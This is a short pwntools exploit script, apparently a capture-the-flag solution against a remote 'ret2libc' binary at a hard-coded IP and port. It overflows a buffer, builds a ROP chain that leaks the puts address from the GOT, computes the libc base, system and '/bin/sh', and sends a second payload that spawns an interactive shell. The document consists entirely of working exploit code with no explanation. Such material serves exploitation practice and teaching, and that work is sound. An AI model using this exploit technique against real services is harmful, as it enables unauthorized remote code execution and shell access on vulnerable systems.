from pwn import *
p = remote("143.198.127.103",42001)
context.log_level='debug'
#p = process("./ret2libc")
elf = ELF("./ret2libc")
libc = ELF("./libc-2.31.so")
pop_rdi = 0x40155b
binsh_offset = next(libc.search(b"/bin/sh\x00"))


payload = b'\x90'*40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['learn'])

pause()
p.sendline(payload)
#p.recv()
p.recvuntil("I see, you must be a natural!\n\n")
puts = u64(p.recv(6) + b"\x00\x00")
print(puts)

base = puts - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + binsh_offset

print("puts" + hex(puts))
print("system" + hex(system))
print("binsh" + hex(binsh))
payload = b'\x90'*40
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()